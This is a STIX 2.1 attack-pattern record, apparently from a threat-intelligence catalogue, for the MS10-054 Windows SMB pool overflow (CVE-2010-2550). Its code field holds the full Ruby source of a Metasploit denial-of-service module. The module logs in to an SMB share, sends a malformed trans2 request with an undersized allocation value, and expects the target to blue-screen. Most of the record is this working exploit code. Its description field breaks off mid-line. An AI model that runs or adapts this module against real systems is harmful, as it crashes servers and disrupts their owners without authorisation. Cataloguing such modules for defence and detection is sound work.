{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5dbd1e6b-bdac-4168-9338-bdc189fd55b9",
    "created": "2024-08-14T16:25:44.873741Z",
    "modified": "2024-08-14T16:25:44.873745Z",
    "name": "Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS",
    "description": " This module exploits a denial of service flaw in the Microsoft Windows SMB service on versions of Windows prior to the August 2010 Patch Tuesday. To trigger this bug, you must be able to access a share with at least read privileges. That generally means you will need authentication. However, if a system has a guest accessible share, you can trigger it without any authentication.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow.rb",
            "external_id": "ms10_054_queryfs_pool_overflow.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2010/Aug/122"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SMB::Client\n  include Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS',\n      'Description'    => %q{\n          This module exploits a denial of service flaw in the Microsoft\n        Windows SMB service on versions of Windows prior to the August 2010 Patch\n        Tuesday. To trigger this bug, you must be able to access a share with\n        at least read privileges. That generally means you will need authentication.\n        However, if a system has a guest accessible share, you can trigger it\n        without any authentication.\n      },\n      'References'     =>\n        [\n          ['CVE', '2010-2550'],\n          ['OSVDB', '66974'],\n          ['MSB', 'MS10-054'],\n          ['URL', 'https://seclists.org/fulldisclosure/2010/Aug/122']\n        ],\n      'Author'         => [ 'Laurent Gaffie <laurent.gaffie[at]gmail.com>', 'jduck' ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(445),\n        OptString.new('SMBSHARE', [ true, \"The name of a readable share on the server\" ])\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  # Perform a transaction2 request using the specified subcommand, parameters, and data\n  def malformed_trans2(subcommand, param = '', body = '')\n\n    # values < 0xc (not inclusive) causes a crash\n    alloc_sz = rand(0x0c)\n\n    setup_count = 1\n    setup_data = [subcommand].pack('v')\n\n    data = param + body\n\n    pkt = CONST::SMB_TRANS2_PKT.make_struct\n    simple.client.smb_defaults(pkt['Payload']['SMB'])\n\n    base_offset = pkt.to_s.length + (setup_count * 2) - 4\n    param_offset = base_offset\n    data_offset = param_offset + param.length\n\n    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2\n    pkt['Payload']['SMB'].v['Flags1'] = 0x0\n    pkt['Payload']['SMB'].v['Flags2'] = 0xc801\n    pkt['Payload']['SMB'].v['WordCount'] = 14 + setup_count\n\n    pkt['Payload'].v['ParamCountTotal'] = param.length\n    pkt['Payload'].v['DataCountTotal'] = body.length\n    pkt['Payload'].v['ParamCountMax'] = 0\n\n    # this value becomes the allocation size\n    pkt['Payload'].v['DataCountMax'] = alloc_sz\n\n    pkt['Payload'].v['ParamCount'] = param.length\n    pkt['Payload'].v['ParamOffset'] = param_offset + 3\n    pkt['Payload'].v['DataCount'] = body.length\n    pkt['Payload'].v['DataOffset'] = data_offset + 3\n    pkt['Payload'].v['SetupCount'] = setup_count\n    pkt['Payload'].v['SetupData'] = setup_data\n\n    pkt['Payload'].v['Payload'] = \"\\x00\\x44\\x20\" + data\n\n    exploit = pkt.to_s\n    exploit[data_offset,2] = [5].pack('v')\n\n    #print_status(\"\\n\" + Rex::Text.to_hex_dump(exploit))\n\n    simple.client.smb_send(exploit)\n\n    # no waiting for recv :)\n  end\n\n\n  def run\n\n    connect(versions: [1])\n\n    simple.login(\n      datastore['SMBName'],\n      datastore['SMBUser'],\n      datastore['SMBPass'],\n      datastore['SMBDomain']\n    )\n    simple.connect(\"\\\\\\\\#{datastore['RHOST']}\\\\#{datastore['SMBSHARE']}\")\n\n    print_status(\"Sending malformed trans2 request..\")\n    params = [\n      \"\\x05\\x01\",  # Query FS Attribute Info (0x0105)\n      \"\\x02\\x01\"   # Query FS Volume Info (0x0102)\n    ]\n    idx = rand(params.length)\n    malformed_trans2(0x03, params[idx])\n\n    print_status(\"The target should encounter a blue screen error now.\")\n    select(nil, nil, nil, 0.5)\n\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Laurent Gaffie <laurent.gaffie[at]gmail.com>",
        "jduck ]",
        ""
    ]
}